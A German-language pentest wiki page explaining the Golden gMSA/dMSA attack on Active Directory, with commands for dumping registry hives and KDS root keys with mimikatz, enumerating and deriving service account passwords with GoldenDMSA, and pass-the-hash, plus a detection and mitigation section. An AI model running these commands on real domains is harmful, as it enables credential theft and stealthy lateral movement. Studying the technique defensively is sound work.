# Golden gMSA/dMSA Angriff (Offline-Ableitung von Passwörtern für verwaltete Dienstkonten)

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Windows Managed Service Accounts (MSA) sind spezielle Prinzipien, die entwickelt wurden, um Dienste auszuführen, ohne dass die Passwörter manuell verwaltet werden müssen. Es gibt zwei Hauptvarianten:

1. **gMSA** – gruppenverwaltetes Dienstkonto – kann auf mehreren Hosts verwendet werden, die in seinem `msDS-GroupMSAMembership` Attribut autorisiert sind.
2. **dMSA** – delegiertes Managed Service Account – der (Vorschau-) Nachfolger von gMSA, der auf derselben Kryptografie basiert, aber granularere Delegationsszenarien ermöglicht.

Für beide Varianten wird das **Passwort nicht** auf jedem Domain Controller (DC) wie ein regulärer NT-Hash gespeichert. Stattdessen kann jeder DC das aktuelle Passwort **on-the-fly** ableiten von:

* Dem forestweiten **KDS Root Key** (`KRBTGT\KDS`) – zufällig generierter GUID-benannter Geheimnis, das auf jeden DC im `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` Container repliziert wird.
* Der Zielkonto **SID**.
* Einer pro Konto **ManagedPasswordID** (GUID), die im `msDS-ManagedPasswordId` Attribut gefunden wird.

Die Ableitung ist: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 Byte Blob, das schließlich **base64-kodiert** und im `msDS-ManagedPassword` Attribut gespeichert wird. Kein Kerberos-Verkehr oder Domäneninteraktion ist während der normalen Passwortnutzung erforderlich – ein Mitglieds-Host leitet das Passwort lokal ab, solange es die drei Eingaben kennt.

## Golden gMSA / Golden dMSA Angriff

Wenn ein Angreifer alle drei Eingaben **offline** erhalten kann, kann er **gültige aktuelle und zukünftige Passwörter** für **jedes gMSA/dMSA im Forest** berechnen, ohne den DC erneut zu berühren, wodurch umgangen wird:

* Kerberos-Vorautorisierung / Ticketanforderungsprotokolle
* LDAP-Leseaudits
* Passwortänderungsintervalle (sie können vorab berechnen)

Dies ist analog zu einem *Golden Ticket* für Dienstkonten.

### Voraussetzungen

1. **Forest-weite Kompromittierung** von **einem DC** (oder Enterprise Admin). `SYSTEM`-Zugriff ist ausreichend.
2. Fähigkeit, Dienstkonten aufzulisten (LDAP-Lesen / RID-Brute-Force).
3. .NET ≥ 4.7.2 x64 Arbeitsstation, um [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) oder gleichwertigen Code auszuführen.

### Phase 1 – Extrahieren des KDS Root Key

Dump von jedem DC (Volume Shadow Copy / rohe SAM+SECURITY-Hives oder entfernte Geheimnisse):
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
Der base64-String mit der Bezeichnung `RootKey` (GUID-Name) wird in späteren Schritten benötigt.

### Phase 2 – Enumerieren von gMSA/dMSA-Objekten

Rufen Sie mindestens `sAMAccountName`, `objectSid` und `msDS-ManagedPasswordId` ab:
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementiert Hilfsmodi:
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### Phase 3 – Erraten / Entdecken der ManagedPasswordID (wenn fehlend)

Einige Deployments *entfernen* `msDS-ManagedPasswordId` von ACL-geschützten Lesevorgängen. 
Da die GUID 128-Bit ist, ist naives Brute-Forcing unpraktisch, aber:

1. Die ersten **32 Bit = Unix-Epoche** der Kontoerstellung (Minutenauflösung).
2. Gefolgt von 96 zufälligen Bits.

Daher ist eine **enge Wortliste pro Konto** (± wenige Stunden) realistisch.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
Das Tool berechnet Kandidatenpasswörter und vergleicht ihren Base64-BLOB mit dem echten `msDS-ManagedPassword`-Attribut – die Übereinstimmung zeigt die korrekte GUID an.

### Phase 4 – Offline-Passwortberechnung & -konvertierung

Sobald die ManagedPasswordID bekannt ist, ist das gültige Passwort nur einen Befehl entfernt:
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
Die resultierenden Hashes können mit **mimikatz** (`sekurlsa::pth`) oder **Rubeus** für Kerberos-Missbrauch injiziert werden, was stealth **lateral movement** und **persistence** ermöglicht.

## Detection & Mitigation

* Beschränken Sie die **DC-Backup- und Registry-Hive-Lese**-Fähigkeiten auf Tier-0-Administratoren.
* Überwachen Sie die Erstellung des **Directory Services Restore Mode (DSRM)** oder der **Volume Shadow Copy** auf DCs.
* Protokollieren Sie Lesevorgänge / Änderungen an `CN=Master Root Keys,…` und `userAccountControl`-Flags von Dienstkonten.
* Erkennen Sie ungewöhnliche **base64 Passwortschreibvorgänge** oder plötzliche Wiederverwendung von Dienstpasswörtern über Hosts hinweg.
* Ziehen Sie in Betracht, hochprivilegierte gMSAs in **klassische Dienstkonten** mit regelmäßigen zufälligen Rotationen umzuwandeln, wo eine Tier-0-Isolation nicht möglich ist.

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – Referenzimplementierung, die auf dieser Seite verwendet wird.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket unter Verwendung abgeleiteter AES-Schlüssel.

## References

- [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
- [Improsec – Golden gMSA trust attack](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
